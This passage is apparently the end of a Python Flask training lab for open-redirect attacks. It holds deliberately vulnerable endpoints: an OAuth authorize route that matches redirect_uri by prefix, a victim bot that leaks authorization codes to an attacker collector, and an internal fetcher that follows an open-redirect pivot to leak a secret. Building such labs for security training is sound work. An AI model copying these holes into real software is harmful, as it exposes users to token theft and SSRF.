    client = _OAUTH_CLIENTS.get(request.args.get("client_id", ""))
    if client is None:
        return make_response("unknown client_id", 400)
    rid = request.args.get("redirect_uri", "")
    # Bug: prefix check instead of exact registered-URI matching.
    if not rid.startswith("http://" + CLIENT_HOST):
        return make_response("error: redirect_uri not registered", 400)
    victim_bot = request.cookies.get("l9_bot", "") == BOT_COOKIE
    if "user" not in session and not victim_bot:
        return _oauth_login_form(request.full_path if request.query_string else request.path)
    code = secrets.token_hex(8)
    with STATE_LOCK:
        STATE["oauth_codes"][code] = session.get("user", "victim-bot")
    sep = "&" if "?" in rid else "?"
    state = request.args.get("state", "")
    return redirect(f"{rid}{sep}code={code}&state={state}")


@LAB.route("/oauth/callback")
def oauth_callback() -> Response:
    """Legit client callback: exact-match style check (shows the contrast)."""
    registered = _OAUTH_CLIENTS["webdemo"]["redirect_uris"][0]
    here = LAB_BASE + request.full_path.rstrip("?")
    if here != registered:
        return make_response("callback: this client accepts only exact registered URIs", 400)
    code = request.args.get("code", "")
    return render_page("oauth callback", (
        "<h1>OAuth callback</h1>"
        f"<p>Received authorization code: <code class='k'>{escape(code)}</code></p>"
        "<p class='muted'>A correct endpoint compared the exact registered redirect_uri. "
        "The provider did not.</p>"
    ))


@LAB.route("/oauth/token", methods=["POST", "GET"])
def oauth_token() -> Response:
    """Mock token endpoint (cosmetic): signs any code without real validation."""
    code = request.values.get("code", "")
    return Response(
        json_payload({
            "access_token": "mock_at_" + _rand_hex(12),
            "token_type": "Bearer",
            "expires_in": 3600,
            "mock": f"redeemed code={code!r} (no real material is issued here)",
        }),
        content_type="application/json",
    )


@LAB.route("/l9/bot", methods=["POST", "GET"])
def l9_bot() -> Response:
    """Victim simulator: fetches your URL 'as a logged-in user', follows redirects.

    The request never leaves loopback; the bot's cookie authenticates the mock
    OAuth provider so no manual login is needed.
    """
    url = request.values.get("url", "")
    if not url:
        return redirect("/l9")
    result = lab_fetch(url, headers={"Cookie": f"l9_bot={BOT_COOKIE}", "User-Agent": "victim-bot/1.0"})
    chain_rows = ""
    for hop in result.get("chain", []):
        chain_rows += f"<li><span class='mono'>{escape(str(hop['status']))}</span> → <span class='mono'>{escape(hop['url'])}</span></li>"
    if result.get("err"):
        chain_rows += f"<li class='mono' style='color:#ef6c6c'>{escape(result['err'])}</li>"
    body = (
        "<h1>Victim bot experience</h1>"
        "<div class='card'><p><b>Requested URL:</b> <span class='mono' style='word-break:break-all'>"
        f"{escape(url)}</span></p>"
        f"<p><b>The victim's redirect experience:</b></p><ol class='tight'>{chain_rows}</ol>"
        "<p class='muted'>If the last hop hit the collector, check "
        f"{ATTACKER_BASE}/logs (or <a href='/attacker-mirror'>/attacker-mirror</a>) for the leaked <code class='k'>code=</code>.</p>"
        "<p><a href='/l9'>back to L9</a></p></div>"
    )
    return render_page("victim bot", body)

# ---------------------------------------------------------------------------
# Chained fetcher / mini-SSRF — Level 10
# ---------------------------------------------------------------------------


@LAB.route("/internal/secret")
def internal_secret() -> Response:
    """Fake internal service: only reachable with the fetcher's zone marker."""
    if request.headers.get("X-Lab-Zone", "") != "internal":
        body = (
            "<h1>403 — internal zone</h1>"
            "<p class='muted'>This service is only reachable from the internal report "
            "fetcher. Browsing it directly is refused. (This boundary is simulated "
            "with a marker header the fetcher attaches.)</p>"
        )
        return render_page("internal", body, status=403)
    payload = {
        "service": "internal-inventory",
        "internal_secret": STATE["internal_secret"],
        "note": "the pivot (l10/pivot) can append this to any URL when include=secret",
    }
    return Response(json_payload(payload), content_type="application/json")


def json_payload(obj: dict) -> str:
    import json as _json
    return _json.dumps(obj, indent=2)


@LAB.route("/l10/pivot")
def l10_pivot() -> Response:
    """Internal URL-forwarding utility — an open redirect inside the zone.

    The chain of the L10 bug: reachable only through the allowlisted fetcher,
    yet it redirects anywhere; with include=secret it appends the internal
    secret to the hop, simulating a readable internal resource.
    """
    target = request.args.get("p", "")
    if not target:
        return make_response("pivot usage: ?p=<url> — internal utility", 400)
    if request.args.get("include") == "secret":
        sep = "&" if "?" in target else "?"
        target += f"{sep}leaked_internal_secret={STATE['internal_secret']}"
    return redirect(target)


@LAB.route("/l10/fetch")
def l10_fetch() -> Response:
    """Allowlisted internal fetcher that blindly follows redirects (L10 bug)."""
    url = request.args.get("url", "")
    if not url:
        return redirect("/l10")
    if urllib.parse.urlparse(url).hostname != INTERNAL_HOST:
        return make_response("blocked: only http://internal.lab/* may be fetched", 400)
    # Bug (downstream in the fetch library): hops are followed unvalidated.
    result = lab_fetch(url, headers={"X-Lab-Zone": "internal", "User-Agent": "report-fetcher/1.0"})
    chain_rows = "".join(
        f"<li><span class='mono'>{escape(str(h['status']))}</span> → "
        f"<span class='mono'>{escape(h['url'])}</span></li>"
        for h in result.get("chain", [])
    )
    if result.get("err"):
        chain_rows += f"<li class='mono' style='color:#ef6c6c'>{escape(result['err'])}</li>"
    # Blind SSRF flavour: the payload's body is NOT shown, only metadata.
    meta = (
        f"final status: <b class='mono'>{result.get('status')}</b> · "
        f"content-type: <span class='mono'>{escape(str(result.get('ctype')))}</span> · "
        f"bytes: <span class='mono'>{result.get('length', 0)}</span> (body withheld — blind)"
        if "err" not in result else "fetch aborted"
    )
    body = (
        "<h1>Internal report fetcher</h1>"
        "<div class='card'>"
        f"<p><b>First hop:</b> <span class='mono' style='word-break:break-all'>{escape(url)}</span></p>"
        f"<p><b>Redirect chain:</b></p><ol class='tight'>{chain_rows}</ol>"
        f"<p><b>Blind report:</b> {meta}</p>"
        "<p class='muted'>A correct implementation re-validates every hop. A chained open "
        "redirect inside the internal zone turns this allowlist into an exfil channel.</p>"
        "<p><a href='/l10'>back to L10</a></p></div>"
    )
    return render_page("report fetcher", body)

# ---------------------------------------------------------------------------
# Startup: two servers, one process
# ---------------------------------------------------------------------------


def _serve(app: Flask, port: int) -> None:
    """Run one Flask app with Werkzeug's threaded server, loopback only."""
    import logging

    logging.getLogger("werkzeug").setLevel(logging.WARNING)
    from werkzeug.serving import make_server

    host = LAB_HOST if port == LAB_PORT else ATTACKER_HOST
    server = make_server(host, port, app, threaded=True)
    server.serve_forever()


def main() -> None:
    """Boot the attacker collector in a thread and the lab in the foreground."""
    for n, lv in enumerate(LEVELS, start=1):
        assert lv.num == n, "levels must be ordered 1..10"
    t = threading.Thread(target=_serve, args=(ATTACKER, ATTACKER_PORT), daemon=True)
    t.start()
    banner = (
        "\n"
        "==============================================================\n"
        "  OPEN REDIRECT TRAINING LAB — 10 levels\n"
        "  Intentionally vulnerable. For local training only.\n"
        "==============================================================\n"
        f"  Lab (main app):        http://{LAB_HOST}:{LAB_PORT}\n"
        f"  Attacker collector:    http://{ATTACKER_HOST}:{ATTACKER_PORT}/logs\n"
        "  Tooling: browser + DevTools, curl -i, or Burp Suite.\n"
        "  Gotcha: browsers refuse connections to port 6000 (restricted list).\n"
        f"  Browser-safe hop: {LAB_BASE}/collect?level=N — relays loot to :6000.\n"
        "  Everything stays in memory; restart = fresh flags.\n"
        "==============================================================\n"
    )
    print(banner, flush=True)
    _serve(LAB, LAB_PORT)  # foreground thread keeps the process alive


if __name__ == "__main__":
    main()
